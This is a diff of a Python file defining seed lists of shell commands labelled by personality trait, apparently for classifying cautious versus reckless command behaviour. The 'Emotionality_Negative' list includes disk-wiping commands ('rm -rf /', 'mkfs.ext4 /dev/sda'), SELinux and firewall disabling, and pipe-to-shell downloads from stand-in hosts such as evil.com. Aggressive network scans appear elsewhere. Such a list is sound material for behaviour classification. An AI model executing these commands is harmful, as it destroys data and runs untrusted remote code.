@@ -35,27 +35,42 @@ SEED_SETS = {
     
     # ========== EMOTIONALITY ==========
     "Emotionality_Positive": [
-        # Comandos que demonstram cautela e busca por suporte
-        "backup", "rsync -av", "cp -p", "tar -czf", "gzip", "zip",
-        "systemctl enable", "systemctl start", "mount -o ro", "fsck -n",
-        "ping -c 1", "telnet", "ssh -v", "curl --connect-timeout",
-        "nmap -sn", "nmap -sT", "traceroute", "mtr", "dig +trace",
-        "tail -f", "watch", "sleep", "timeout", "wait",
-        "systemctl reload", "systemctl restart", "journalctl -f",
-        "docker logs -f", "kubectl logs -f", "ansible --check",
-        "terraform plan", "git stash", "git branch", "git checkout -b",
+        # Backup e proteção (cautela clara)
+        "rsync -av --backup", "rsync --dry-run", "cp -p", "cp -i",
+        "tar -czf backup_", "duplicity", "git stash", "git stash save",
+
+        # Verificação antes de ação
+        "fsck -n", "mount -o ro", "ansible --check", "terraform plan",
+        "kubectl diff", "git diff", "rsync -n",
+
+        # Monitoramento defensivo
+        "tail -f /var/log/auth.log", "journalctl -f -u",
+        "docker logs -f --tail 100", "watch -n 5",
+
+        # Comandos de segurança
+        "systemctl enable", "ufw enable", "fail2ban-client status",
+        "chkrootkit", "rkhunter --check",
     ],
-    
+
     "Emotionality_Negative": [
-        # Comandos que demonstram indiferença a riscos
-        "rm -rf", "dd if=/dev/urandom", "shred -vfz", "wipe -rf",
-        "kill -9", "killall -9", "pkill -f", "systemctl kill",
+        # Destrutivo imprudente
+        "rm -rf /", "rm -rf /*", "dd if=/dev/urandom of=/dev/sda",
+        "shred -vfz -n 10", "wipe -rf", "srm -rf",
+        "mkfs.ext4 /dev/sda", "wipefs -a",
+
+        # Kill agressivo
+        "kill -9 -1", "killall -9", "pkill -9 -f",
+        "systemctl kill --signal=SIGKILL",
+
+        # Desabilitar proteções imprudentemente
         "iptables -F", "ufw disable", "systemctl stop firewalld",
-        "mount -o rw,remount", "chmod -R 777", "chown -R root:root",
-        "docker rm -f", "docker kill", "kubectl delete --force --now",
-        "terraform destroy -auto-approve", "git push --force-with-lease",
-        "curl --max-time 1", "wget --timeout=1", "nmap -T5 -A",
-        "nc -z", "ncat --exec", "socat -", "proxychains4 -q",
+        "setenforce 0", "mount -o rw,remount /",
+
+        # Execução sem verificação
+        "curl http://evil.com/script.sh | bash",
+        "wget -O- http://malware.com | sh",
+        "docker run --rm --privileged", "kubectl delete --all --grace-period=0",
+        "terraform destroy -auto-approve",
     ],
     
     # ========== EXTRAVERSION ==========
@@ -85,27 +100,49 @@ SEED_SETS = {
     
     # ========== AGREEABLENESS ==========
     "Agreeableness_Positive": [
-        # Comandos que demonstram cooperação e flexibilidade
-        "git merge", "git rebase", "git cherry-pick", "git pull --rebase",
-        "systemctl reload", "systemctl restart", "service reload",
-        "docker-compose up", "docker-compose restart", "kubectl apply",
-        "ansible-playbook --check", "terraform plan", "helm upgrade",
-        "chmod +x", "chown user:group", "setfacl -m", "usermod -aG",
-        "mount", "umount", "sync", "fsync", "fdisk -l",
-        "cp -i", "mv -i", "rm -i", "ln -s", "rsync -av",
-        "curl --retry", "wget --retry-connrefused", "ping -c 3",
+        # Colaboração/flexibilidade
+        "git merge", "git rebase", "git cherry-pick",
+        "git pull --rebase", "git merge --no-ff",
+
+        # Reload suave (sem interromper)
+        "systemctl reload", "nginx -s reload", "apache2ctl graceful",
+        "kill -HUP", "kill -USR1",
+
+        # Permissões colaborativas
+        "chmod +x", "chmod u+rwx,g+rx", "chown user:group",
+        "setfacl -m u:user:rwx", "usermod -aG",
+
+        # Retry/tolerância
+        "curl --retry 3", "wget --retry-connrefused",
+        "rsync --partial", "ping -c 3 -w 5",
+
+        # Aplicação incremental
+        "kubectl apply", "terraform apply", "ansible-playbook",
+        "docker-compose up", "helm upgrade",
     ],
-    
+
     "Agreeableness_Negative": [
-        # Comandos que demonstram rigidez e confronto
-        "kill -9", "killall -9", "pkill -KILL", "systemctl kill",
-        "iptables -j REJECT", "iptables -j DROP", "ufw deny",
-        "chmod 000", "chattr +i", "mount -o ro", "umount -f",
-        "git push --force", "git reset --hard", "git clean -fd",
-        "docker rm -f", "docker kill", "kubectl delete --force",
-        "terraform destroy", "helm uninstall", "systemctl mask",
-        "dd if=/dev/zero", "shred -vfz", "wipe -rf", "secure-delete",
-        "nmap -sS -T5", "nmap -A", "masscan", "zmap", "unicornscan",
+        # Terminação forçada (sem negociação)
+        "kill -9", "kill -SIGKILL", "killall -9",
+        "pkill -KILL", "systemctl kill --signal=SIGKILL",
+
+        # Bloqueio/rejeição
+        "iptables -j REJECT", "iptables -j DROP",
+        "ufw deny", "fail2ban-client ban",
+
+        # Imutabilidade/rigidez
+        "chmod 000", "chmod -R 000", "chattr +i",
+        "mount -o ro,noexec", "mount -o noexec,nosuid,nodev",
+
+        # Destruição forçada
+        "git push --force", "git reset --hard HEAD~10",
+        "git clean -fdx", "docker rm -f",
+        "kubectl delete --force --grace-period=0",
+        "terraform destroy",
+
+        # Varredura agressiva
+        "nmap -sS -T5 -p-", "masscan --rate=10000",
+        "zmap", "unicornscan",
     ],
     
     # ========== CONSCIENTIOUSNESS ==========
